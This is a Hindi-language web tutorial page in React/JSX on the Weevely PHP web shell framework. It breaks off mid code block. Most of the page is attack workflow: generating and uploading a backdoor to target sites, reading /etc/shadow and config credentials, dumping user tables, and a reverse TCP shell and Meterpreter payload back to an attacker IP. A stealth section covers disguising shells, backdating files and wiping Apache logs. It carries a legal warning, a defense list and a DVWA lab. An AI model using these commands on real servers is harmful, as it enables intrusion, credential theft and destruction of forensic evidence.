import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Weevely() {
  return (
    <TutorialLayout
      title="weevely"
      subtitle="PHP वेब शेल मैनेजमेंट और पोस्ट-एक्सप्लॉइटेशन फ्रेमवर्क"
      icon="🐍"
      prev={{ to: '/tool/sqlninja', label: 'sqlninja' }}
      next={{ to: '/tool/wifite', label: 'wifite' }}
    >
      <h2>What is Weevely?</h2>
      <p>
        Weevely एक शक्तिशाली PHP वेब शेल मैनेजमेंट टूल है जो टेस्टर्स को रिमोट वेब सर्वर पर स्टील्दी PHP बैकडोर बनाने और उन्हें प्रबंधित करने की अनुमति देता है। यह टूल टेलीकम्यूटिंग के दौरान वेब शेल के माध्यम से कमांड एक्ज़ीक्यूट करता है, जिसमें शेल और क्लाइंट के बीच कम्युनिकेशन एन्क्रिप्टेड होती है। Weevely को इटैलियन सुरक्षा शोधकर्ता एमिलियानो डोनानो (Emiliano Donadio) ने बनाया था और यह Kali Linux में प्री-इंस्टॉल्ड आता है।
      </p>
      <p>
        Weevely की सबसे बड़ी खासियत है कि यह बहुत छोटे PHP शेल जनरेट करता है जो लगभग अदृश्य होते हैं। ये शेल WAF (वेब एप्लिकेशन फ़ायरवॉल) और एंटीवायरस से बचने के लिए डिज़ाइन किए गए हैं। शेल के अंदर का कोड ऑब्स्क्यूकेटेड होता है और कम्युनिकेशन एन्क्रिप्टेड पासवर्ड-बेस्ड होती है। यह टूल वेब एप्लिकेशन पेनेट्रेशन टेस्टिंग के दौरान पोस्ट-एक्सप्लॉइटेशन के लिए अमूल्य है।
      </p>
      <p>
        Weevely सिर्फ एक शेल जनरेटर नहीं है — यह एक पूरा पोस्ट-एक्सप्लॉइटेशन फ्रेमवर्क है। इसमें 30+ बिल्ट-इन मॉड्यूल हैं जो फ़ाइल ब्राउज़िंग, डेटाबेस एक्सेस, नेटवर्क स्कैनिंग, क्रेडेंशियल हार्वेस्टिंग, और रिवर्स शेल जैसे कार्य करते हैं। फ़ाइल अपलोड वल्नरेबिलिटी मिलने के बाद, Weevely सबसे अच्छा विकल्प है परसिस्टेंट एक्सेस के लिए। यह Python में लिखा गया है और इसका आर्किटेक्चर मॉड्यूलर है — हर फीचर अलग मॉड्यूल की तरह काम करता है।
      </p>
      <p>
        Weevely का नाम "Web Evil" से आया है — यानी वेब के माध्यम से बुराई। यह टूल वेब एप्लिकेशन सिक्योरिटी टेस्टिंग में बहुत महत्वपूर्ण भूमिका निभाता है। जब किसी वेबसाइट में फ़ाइल अपलोड वल्नरेबिलिटी मिलती है, तो Weevely से PHP शेल बनाकर अपलोड किया जाता है। फिर Weevely क्लाइंट से कनेक्ट करके रिमोट सर्वर पर कमांड चलाए जाते हैं। यह प्रक्रिया पूरी तरह से एन्क्रिप्टेड होती है इसलिए WAF और IDS से बचना आसान हो जाता है।
      </p>
      <p>
        Weevely का उपयोग रेड टीम ऑपरेशंस, बग बाउंटी, और सुरक्षा ऑडिट में व्यापक रूप से होता है। यह टूल काली लिनक्स, पैरोट ओएस, और अन्य पेनेट्रेशन टेस्टिंग डिस्ट्रीब्यूशंस में प्री-इंस्टॉल्ड आता है। Weevely 3 (Gen3) सबसे लेटेस्ट वर्जन है जिसमें बेहतर एन्क्रिप्शन, ज़्यादा मॉड्यूल्स, और बेहतर ऑब्स्क्यूकेशन है। यह टूल GitHub पर ओपन सोर्स है और इसकी कम्युनिटी एक्टिव है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Weevely केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए उपयोग करें। बिना अनुमति के वेब शेल बनाना और अपलोड करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत वेब शेल अपराध हो सकता है। साइबर अपराध गंभीर परिणामों का कारण बन सकता है — जुर्माना और जेल दोनों हो सकते हैं। केवल अपने लैब वातावरण या लिखित प्राधिकरण के साथ ही उपयोग करें।
      </div>

      <h2>History of Weevely</h2>
      <p>
        Weevely का विकास 2011 में इटैलियन सुरक्षा शोधकर्ता एमिलियानो डोनानो (Emiliano Donadio, GitHub: epinna) ने शुरू किया था। इसका उद्देश्य पेनेट्रेशन टेस्टिंग के दौरान वेब सर्वर पर स्टील्दी एक्सेस बनाए रखना था। उस समय वेब शेल्स बड़े और आसानी से डिटेक्ट होने वाले होते थे — Weevely ने इस समस्या को हल किया।
      </p>
      <p>
        Weevely 2012 में BackTrack Linux में शामिल हुआ और बाद में Kali Linux में भी प्री-इंस्टॉल्ड आने लगा। इसे Offensive Security टीम ने अपने टूलसेट में शामिल किया। Weevely 3 (Gen3) 2014 में रिलीज़ हुआ जिसमें बेहतर एन्क्रिप्शन, ज़्यादा मॉड्यूल्स, और बेहतर ऑब्स्क्यूकेशन था। यह वर्जन आज भी इस्तेमाल हो रहा है।
      </p>
      <p>
        Weevely का डिज़ाइन दर्शन यह है कि वेब शेल छोटा, ऑब्स्क्यूकेटेड, और एन्क्रिप्टेड होना चाहिए। बड़े शेल्स आसानी से डिटेक्ट हो जाते हैं — इसलिए Weevely सिर्फ कुछ बाइट्स का PHP कोड जनरेट करता है। यह कोड देखने में सामान्य PHP लगता है लेकिन अंदर पूरा C2 (Command and Control) छुपा होता है। यही Weevely को अन्य वेब शेल्स से अलग बनाता है।
      </p>
      <p>
        2015-2018 के बीच Weevely community ने कई नए modules contribute किए — database access, network scanning, और credential harvesting modules इस दौरान add हुए। 2019 में Python 3 migration complete हुई जिससे tool modern systems पर बेहतर काम करने लगा। 2020 के बाद COVID-19 pandemic के दौरान remote work बढ़ने से web application security testing की demand बढ़ी और Weevely का उपयोग भी बढ़ा।
      </p>
      <p>
        आज Weevely web application penetration testing में standard tool माना जाता है। OSCP, OSWE, और GWAPT जैसी certifications में web shell management knowledge required है। Weevely open source community actively maintain कर रही है — नए modules और bug fixes regularly आते रहते हैं। GitHub पर 4000+ stars हैं और contributors worldwide हैं।
      </p>

      <h2>How Weevely Works?</h2>
      <p>
        Weevely का आर्किटेक्चर क्लाइंट-सर्वर मॉडल पर आधारित है। PHP शेल सर्वर पर होता है और Weevely क्लाइंट आपकी मशीन पर। दोनों के बीच HTTP रिक्वेस्ट/रिस्पॉन्स के माध्यम से कम्युनिकेशन होती है जो पूरी तरह से एन्क्रिप्टेड होती है।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">शेल जनरेशन:</strong> PHP बैकडोर बनाता है जो ऑब्स्क्यूकेटेड और छोटा होता है (~200 बाइट्स)</li>
        <li><strong className="text-white">एन्क्रिप्टेड कम्युनिकेशन:</strong> पासवर्ड-बेस्ड AES एन्क्रिप्शन से कमांड और रिजल्ट सुरक्षित रहते हैं</li>
        <li><strong className="text-white">HTTP कम्युनिकेशन:</strong> सामान्य HTTP POST/GET रिक्वेस्ट की तरह दिखता है, WAF से बचता है</li>
        <li><strong className="text-white">मॉड्यूल सिस्टम:</strong> 30+ पोस्ट-एक्सप्लॉइटेशन मॉड्यूल्स जो अलग-अलग कार्य करते हैं</li>
        <li><strong className="text-white">सत्र प्रबंधन:</strong> कई शेल एक साथ मैनेज कर सकते हो — हर शेल का अपना सत्र होता है</li>
        <li><strong className="text-white">ऑटो-डिटेक्शन:</strong> PHP वर्जन, ऑपरेटिंग सिस्टम, और अनुमतियाँ ऑटो-डिटेक्ट करता है</li>
        <li><strong className="text-white">टर्मिनल एमुलेशन:</strong> रिमोट सर्वर पर जैसे लोकल टर्मिनल में काम कर रहे हो</li>
        <li><strong className="text-white">स्टील्थ मोड:</strong> लॉग्स में कम से कम निशान छोड़ता है — एंटी-फोरेंसिक टेक्निक्स</li>
      </ul>

      <h2>Installation</h2>
      <p>
        Weevely Kali Linux में प्री-इंस्टॉल्ड आता है। अगर किसी कारण से नहीं है तो आसानी से इंस्टॉल कर सकते हैं।
      </p>
      <CodeBlock
        title="Weevely इंस्टॉलेशन"
        code={`# apt से (सबसे आसान):
sudo apt update
sudo apt install weevely

# Git से (सबसे लेटेस्ट):
git clone https://github.com/epinna/weevely3.git
cd weevely3
pip3 install -r requirements.txt

# सोर्स से (डेवलपमेंट):
git clone https://github.com/epinna/weevely3.git
cd weevely3
python3 setup.py install

# वर्जन चेक:
weevely --version

# सहायता:
weevely --help

# डिपेंडेंसी:
# Python 3.6+, requests, beautifulsoup4, python-dateutil`}
      />

      <h2>Basic Usage</h2>
      <p>
        Weevely का बेसिक इस्तेमाल दो स्टेप्स में होता है — पहले शेल जनरेट करो, फिर उसे अपलोड करके कनेक्ट करो।
      </p>
      <CodeBlock
        title="बेसिक वर्कफ़्लो"
        code={`# स्टेप 1: PHP शेल जनरेट करें:
weevely generate mypassword /tmp/shell.php

# स्टेप 2: शेल को टार्गेट सर्वर पर अपलोड करें
# (फ़ाइल अपलोड वल्नरेबिलिटी का उपयोग करें)

# स्टेप 3: शेल से कनेक्ट करें:
weevely http://target.com/uploads/shell.php mypassword

# कनेक्ट होने पर कमांड प्रॉम्प्ट मिलेगा:
# weevely> whoami
# www-data
# weevely> ls /var/www/
# weevely> cat /etc/passwd`}
      />
      <CodeBlock
        title="विभिन्न शेल प्रकार"
        code={`# बेसिक PHP शेल:
weevely generate password /tmp/shell.php

# कस्टम आउटपुट पाथ:
weevely generate mypassword /var/www/html/uploads/shell.php

# शेल बहुत छोटा होता है (~<?php ... ?>)
# एन्क्रिप्टेड कम्युनिकेशन के लिए पासवर्ड यूज़ होता है

# शेल का कंटेंट देखें:
cat /tmp/shell.php
# देखने में सामान्य PHP कोड लगता है
# लेकिन अंदर बैकडोर छुपा है`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Command</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">generate</td><td className="py-2 px-3">PHP शेल जनरेट करता है</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_browse</td><td className="py-2 px-3">वेब फ़ाइल मैनेजर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_upload</td><td className="py-2 px-3">लोकल फ़ाइल अपलोड करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_download</td><td className="py-2 px-3">रिमोट फ़ाइल डाउनलोड करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:sql_console</td><td className="py-2 px-3">SQL डेटाबेस शेल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:net_scan</td><td className="py-2 px-3">नेटवर्क पोर्ट स्कैन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:backdoor_reversetcp</td><td className="py-2 px-3">रिवर्स TCP शेल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:bruteforce_sql</td><td className="py-2 px-3">SQL ब्रूटफोर्स</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:audit_phpconf</td><td className="py-2 px-3">PHP कॉन्फ़िग ऑडिट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:shell_sh</td><td className="py-2 px-3">सिस्टम शेल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_read</td><td className="py-2 px-3">फ़ाइल पढ़ें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_write</td><td className="py-2 px-3">फ़ाइल लिखें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_touch</td><td className="py-2 px-3">टाइमस्टैम्प बदलें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:audit_filesystem</td><td className="py-2 px-3">फ़ाइल सिस्टम ऑडिट</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">:audit_suidsgid</td><td className="py-2 px-3">SUID/SGID फ़ाइलें खोजें</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Post-Exploitation Modules</h2>
      <p>
        Weevely में 30+ पोस्ट-एक्सप्लॉइटेशन मॉड्यूल हैं जो विभिन्न कार्य करते हैं:
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">मॉड्यूल</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_browse</td><td className="py-2 px-3">वेब फ़ाइल मैनेजर</td><td className="py-2 px-3 font-mono text-xs">:file_browse /var/www</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_read</td><td className="py-2 px-3">फ़ाइल पढ़ें</td><td className="py-2 px-3 font-mono text-xs">:file_read /etc/passwd</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_write</td><td className="py-2 px-3">फ़ाइल लिखें</td><td className="py-2 px-3 font-mono text-xs">:file_write content /tmp/f.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_upload</td><td className="py-2 px-3">लोकल फ़ाइल अपलोड</td><td className="py-2 px-3 font-mono text-xs">:file_upload local.txt /tmp/</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_download</td><td className="py-2 px-3">रिमोट फ़ाइल डाउनलोड</td><td className="py-2 px-3 font-mono text-xs">:file_download /etc/shadow</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:sql_console</td><td className="py-2 px-3">SQL डेटाबेस शेल</td><td className="py-2 px-3 font-mono text-xs">:sql_console -user root -passwd pw</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:net_scan</td><td className="py-2 px-3">नेटवर्क पोर्ट स्कैन</td><td className="py-2 px-3 font-mono text-xs">:net_scan 192.168.1.0/24 22,80</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:backdoor_reversetcp</td><td className="py-2 px-3">रिवर्स TCP शेल</td><td className="py-2 px-3 font-mono text-xs">:backdoor_reversetcp LHOST LPORT</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:bruteforce_sql</td><td className="py-2 px-3">SQL ब्रूटफोर्स</td><td className="py-2 px-3 font-mono text-xs">:bruteforce_sql -users users.txt</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:audit_phpconf</td><td className="py-2 px-3">PHP कॉन्फ़िग ऑडिट</td><td className="py-2 px-3 font-mono text-xs">:audit_phpconf</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:audit_filesystem</td><td className="py-2 px-3">फ़ाइल सिस्टम ऑडिट</td><td className="py-2 px-3 font-mono text-xs">:audit_filesystem /var/www</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:audit_suidsgid</td><td className="py-2 px-3">SUID/SGID फ़ाइलें</td><td className="py-2 px-3 font-mono text-xs">:audit_suidsgid /</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:shell_sh</td><td className="py-2 px-3">सिस्टम शेल</td><td className="py-2 px-3 font-mono text-xs">:shell_sh</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">:file_touch</td><td className="py-2 px-3">टाइमस्टैम्प बदलें</td><td className="py-2 px-3 font-mono text-xs">:file_touch 202001010000 /f.php</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">:file_grep</td><td className="py-2 px-3">फ़ाइल में सर्च</td><td className="py-2 px-3 font-mono text-xs">:file_grep password /var/www</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Database Access</h2>
      <p>
        Weevely SQL डेटाबेस तक पहुंचने की सुविधा देता है। MySQL, PostgreSQL, और SQLite सपोर्टेड हैं। Database credentials आमतौर पर web application config files में मिलते हैं — wp-config.php, config.php, .env, और database.php जैसी फ़ाइलों में। Weevely का :sql_console module direct database access देता है जिससे data extract, modify, और delete कर सकते हो।
      </p>
      <CodeBlock
        title="डेटाबेस ऑपरेशंस"
        code={`# SQL कंसोल खोलें:
:sql_console -user root -passwd password123

# MySQL से कनेक्ट:
:sql_console -user dbuser -passwd dbpass -host localhost -db mydb

# डेटाबेस लिस्ट:
SHOW DATABASES;

# टेबल लिस्ट:
USE mydb;
SHOW TABLES;

# डेटा निकालें:
SELECT * FROM users;
SELECT username, password FROM admins;

# क्रेडेंशियल्स खोजें:
:file_grep "db_pass" /var/www
:file_grep "mysql_connect" /var/www
:file_grep "PDO" /var/www

# कॉन्फ़िग फ़ाइलें पढ़ें:
:file_read /var/www/html/wp-config.php
:file_read /var/www/html/config.php
:file_read /var/www/html/database.php`}
      />

      <h2>Network Scanning</h2>
      <p>
        Weevely से रिमोट सर्वर से नेटवर्क स्कैन कर सकते हो — बिना किसी अतिरिक्त टूल के। यह feature lateral movement के लिए बहुत उपयोगी है। अगर target server internal network से connected है तो Weevely के through internal hosts discover कर सकते हो। Port scanning PHP sockets से होता है इसलिए Nmap जैसा fast नहीं है लेकिन stealth के लिए बेहतर है।
      </p>
      <CodeBlock
        title="नेटवर्क स्कैनिंग"
        code={`# पोर्ट स्कैन:
:net_scan 192.168.1.1 22,80,443,3306

# नेटवर्क रेंज स्कैन:
:net_scan 192.168.1.0/24 22,80

# होस्ट डिस्कवरी:
:net_scan 10.0.0.0/24 80

# कॉमन पोर्ट्स:
:net_scan 192.168.1.1 21,22,23,25,53,80,110,143,443,993,995,3306,3389,5432,8080

# DNS सर्वर खोजें:
:net_scan 192.168.1.0/24 53

# SMB सर्वर खोजें:
:net_scan 192.168.1.0/24 139,445`}
      />

      <h2>Reverse Shell</h2>
      <p>
        Weevely से रिवर्स शेल प्राप्त कर सकते हो — यह बेसिक PHP शेल से ज़्यादा इंटरैक्टिव है। Reverse shell तब useful है जब Weevely का built-in terminal limited लगे — full TTY shell, job control, और interactive programs (vim, top) के लिए reverse shell ज़रूरी है। Metasploit integration से Meterpreter payload भी मिल सकता है जो advanced post-exploitation features देता है।
      </p>
      <CodeBlock
        title="रिवर्स शेल प्राप्त करें"
        code={`# रिवर्स TCP शेल:
# पहले लिसनर शुरू करो (अपनी मशीन पर):
nc -lvnp 4444

# Weevely से रिवर्स शेल भेजो:
:backdoor_reversetcp 192.168.1.100 4444

# मल्टीपल रिवर्स शेल:
# हर शेल अलग पोर्ट पर
nc -lvnp 4444  # पहला शेल
nc -lvnp 4445  # दूसरा शेल

# Meterpreter payload (msfvenom से):
# पहले payload बनाओ:
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw > payload.php

# Weevely से अपलोड करो:
:file_upload payload.php /var/www/html/uploads/

# Metasploit में listener:
msfconsole -q
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j`}
      />

      <h2>Stealth Techniques</h2>
      <p>
        Weevely की सबसे बड़ी ताकत है स्टील्थ — यह डिटेक्शन से बचने के लिए कई तकनीकें इस्तेमाल करता है। Stealth web application security testing में सबसे critical factor है। अगर शेल detect हो जाए तो tester का access cut हो जाता है और client को alert मिल जाता है। Weevely की encryption, obfuscation, और small footprint तीनों मिलकर detection को बहुत मुश्किल बनाते हैं।
      </p>
      <CodeBlock
        title="डिटेक्शन से बचें"
        code={`# 1. शेल का नाम बदलें — "shell.php" मत रखो
weevely generate password /tmp/style.css.php
weevely generate password /tmp/image.jpg.php
weevely generate password /tmp/error_log.php

# 2. टाइमस्टैम्प बदलें — फ़ाइल पुरानी दिखे
:file_touch 202001010000 /var/www/html/uploads/shell.php

# 3. फ़ाइल का मालिक बदलें:
# अगर मिले तो chown से

# 4. डायरेक्ट्री छुपाई:
# /var/www/html/uploads/.hidden/shell.php

# 5. .htaccess से प्रोटेक्ट करें:
:file_write "Deny from all" /var/www/html/uploads/.htaccess

# 6. लॉग्स साफ़ करें:
:file_write "" /var/log/apache2/access.log
:file_write "" /var/log/apache2/error.log

# 7. PHP कोड में मिलाएं:
# शेल को असली PHP फ़ाइल में inject करो`}
      />

      <h2>Weevely vs Other Web Shells</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Weevely</th>
              <th className="text-left py-2 px-3 text-neon-green">C99 Shell</th>
              <th className="text-left py-2 px-3 text-neon-green">b374k</th>
              <th className="text-left py-2 px-3 text-neon-green">p0wny-shell</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">साइज़</td><td className="py-2 px-3">~200 bytes</td><td className="py-2 px-3">~50KB</td><td className="py-2 px-3">~10KB</td><td className="py-2 px-3">~5KB</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">एन्क्रिप्शन</td><td className="py-2 px-3">हाँ (AES)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">CLI Support</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">नहीं (GUI)</td><td className="py-2 px-3">नहीं (GUI)</td><td className="py-2 px-3">नहीं (GUI)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">मॉड्यूल्स</td><td className="py-2 px-3">30+</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">सीमित</td><td className="py-2 px-3">नहीं</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">WAF Bypass</td><td className="py-2 px-3">बेहतरीन</td><td className="py-2 px-3">कमज़ोर</td><td className="py-2 px-3">अच्छा</td><td className="py-2 px-3">कमज़ोर</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">ऑटोमेशन</td><td className="py-2 px-3">हाँ (स्क्रिप्ट)</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">नहीं</td></tr>
            <tr><td className="py-2 px-3 text-white">डिटेक्शन रेट</td><td className="py-2 px-3">कम</td><td className="py-2 px-3">ज़्यादा</td><td className="py-2 px-3">मध्यम</td><td className="py-2 px-3">मध्यम</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'शेल जनरेट नहीं हो रहा', a: 'Python 3.6+ चाहिए। pip3 install -r requirements.txt से डिपेंडेंसी इंस्टॉल करो। Git clone करके setup.py install करो।' },
          { q: 'शेल कनेक्ट नहीं हो रहा', a: 'URL सही है? शेल अपलोड हुआ? PHP enabled है सर्वर पर? --verify-cert false try करो HTTPS के लिए।' },
          { q: 'WAF ब्लॉक कर रहा है', a: 'शेल का नाम बदलो (.jpg.php)। कस्टम .htaccess बनाओ। URL encode try करो।' },
          { q: 'PHP functions disabled हैं', a: 'exec(), system(), shell_exec() disabled हो सकते हैं। :audit_phpconf से चेक करो। अलग मॉड्यूल try करो।' },
          { q: 'शेल डिटेक्ट हो गया', a: 'Antivirus/WAF signature match हो गया। नया शेल generate करो अलग पासवर्ड से। obfuscation level बढ़ाओ।' },
          { q: 'डेटाबेस कनेक्ट नहीं हो रहा', a: 'क्रेडेंशियल्स सही हैं? config.php से निकालो। :file_grep "password" से खोजो। MySQL socket path चेक करो।' },
          { q: 'फ़ाइल अपलोड नहीं हो रही', a: 'फ़ाइल साइज़ लिमिट चेक करो। upload_max_filesize बढ़ाओ। write permissions चेक करो।' },
          { q: 'कनेक्शन बार-बार टूट रहा है', a: 'Network timeout बढ़ाओ। keepalive try करो। शेल को अलग PHP file में डालो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Weevely शेल्स को कैसे डिटेक्ट और ब्लॉक करें:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">फ़ाइल इंटेग्रिटी मॉनिटरिंग:</strong> OSSEC, Tripwire, AIDE से फ़ाइल changes detect करो</li>
        <li><strong className="text-white">WAF रूल्स:</strong> ModSecurity, Cloudflare WAF — PHP ऑब्स्क्यूकेशन patterns block करो</li>
        <li><strong className="text-white">PHP डिसेबल फंक्शंस:</strong> php.ini में disable_functions = exec,system,shell_exec</li>
        <li><strong className="text-white">open_basedir:</strong> PHP सिर्फ specific directories access करे</li>
        <li><strong className="text-white">upload_max_filesize:</strong> छोटा रखो (1MB)</li>
        <li><strong className="text-white">लॉग मॉनिटरिंग:</strong> Apache/nginx लॉग्स में suspicious POST requests देखो</li>
        <li><strong className="text-white">एंटीवायरस:</strong> ClamAV और commercial AV — PHP malware signatures</li>
        <li><strong className="text-white">नेटवर्क मॉनिटरिंग:</strong> अनआउटबाउंड connections ट्रैक करो</li>
        <li><strong className="text-white">PHP सुरक्षा:</strong> allow_url_include = Off, expose_php = Off</li>
        <li><strong className="text-white">वेब डायरेक्ट्री परमिशंस:</strong> uploads directory में PHP execution disable करो (.htaccess)</li>
        <li><strong className="text-white">Runtime Application Self-Protection (RASP):</strong> application-level security जो runtime पर attacks detect करती है</li>
        <li><strong className="text-white">Container Security:</strong> Docker containers में minimal PHP install — unnecessary functions remove करो</li>
        <li><strong className="text-white">Web Application Firewall:</strong> ModSecurity, AWS WAF, Cloudflare WAF — rules customize करो PHP attacks के लिए</li>
        <li><strong className="text-white">Security Headers:</strong> Content-Security-Policy, X-Content-Type-Options set करो — XSS और code injection से बचाव</li>
      </ul>

      <h2>Lab Environment Setup</h2>
      <p>
        Weevely practice के लिए safe lab बनाओ:
      </p>
      <CodeBlock
        title="लैब सेटअप"
        code={`# 1. Web server setup (Ubuntu/Debian):
sudo apt update
sudo apt install apache2 php php-mysql

# 2. Intentionally vulnerable app install करो:
# DVWA (Damn Vulnerable Web Application):
git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
# config.inc.php में database credentials डालो

# 3. File upload vulnerability enable करो:
# DVWA Security → Low सेट करो
# File Upload section जाओ

# 4. Weevely practice:
# शेल जनरेट करो:
weevely generate mypassword /tmp/shell.php

# शेल अपलोड करो (DVWA file upload):
# browser से /tmp/shell.php upload करो

# कनेक्ट करो:
weevely http://localhost/dvwa/hackable/uploads/shell.php mypassword

# 5. Practice workflow:
# शेल generate → upload → connect → modules use → cleanup

# 6. Advanced lab — multiple vulnerable apps:
# bWAPP:
git clone https://github.com/Audi-1/bWAPP.git /var/www/html/bWAPP
# WebGoat (Java-based):
docker run -p 8080:8080 webgoat/webgoat
# Mutillidae:
git clone https://github.com/webpwnized/mutillidae.git /var/www/html/mutillidae

# 7. Network lab (VirtualBox):
# Kali VM + Ubuntu VM + Windows VM
# Internal network में Weevely practice करो
# Network isolation ensure करो — host network से disconnect

# 8. Monitoring setup:
# Apache access log monitor करो:
tail -f /var/log/apache2/access.log
# Weevely traffic pattern देखो — encrypted POST requests

# 9. Detection practice:
# ClamAV install करो:
sudo apt install clamav
clamscan /var/www/html/uploads/
# Weevely शेल detect होता है या नहीं check करो`}
      />

      <h2>Web Shell Management</h2>
      <p>
        Weevely का मुख्य कार्य PHP वेब शेल्स को जनरेट, अपलोड, और मैनेज करना है। यह टूल कई प्रकार के शेल्स बना सकता है जो अलग-अलग परिस्थितियों में उपयोगी होते हैं। हर शेल एन्क्रिप्टेड कम्युनिकेशन use करता है जिससे ट्रैफ़िक सामान्य HTTP जैसा दिखता है।
      </p>
      <p>
        शेल मैनेजमेंट में सबसे महत्वपूर्ण बात है शेल का नाम और लोकेशन। शेल को हमेशा ऐसी जगह रखो जहाँ PHP execution allowed हो और नाम ऐसा हो जो suspicious न लगे। Weevely कई शेल्स एक साथ manage कर सकता है — हर शेल का अपना session होता है। Session management से आप कई सर्वर्स पर एक साथ काम कर सकते हो।
      </p>
      <CodeBlock
        title="मल्टीपल शेल मैनेजमेंट"
        code={`# शेल 1 — वेबसाइट A:
weevely generate pass1 /tmp/shell1.php
# अपलोड करो website-a.com पर
weevely http://website-a.com/uploads/shell1.php pass1

# शेल 2 — वेबसाइट B:
weevely generate pass2 /tmp/shell2.php
# अपलोड करो website-b.com पर
weevely http://website-b.com/images/shell2.php pass2

# शेल 3 — लोकल टेस्ट:
weevely generate testpass /tmp/test.php
weevely http://localhost/uploads/test.php testpass

# सभी शेल्स की लिस्ट:
# Weevely session manager में सभी active connections दिखते हैं

# शेल rename करो (डिटेक्शन से बचने के लिए):
# नया शेल generate करो अलग नाम से
weevely generate newpass /tmp/wp-config.php.bak.php

# शेल verify करो — कनेक्ट हो रहा है या नहीं:
curl -s http://target.com/uploads/shell.php
# अगर PHP code दिखे तो शेल काम कर रहा है`}
      />
      <CodeBlock
        title="शेल ऑब्स्क्यूकेशन तकनीकें"
        code={`# 1. शेल को असली PHP फ़ाइल में inject करो:
# wp-config.php, index.php, ya config.php में

# 2. base64 encoded शेल:
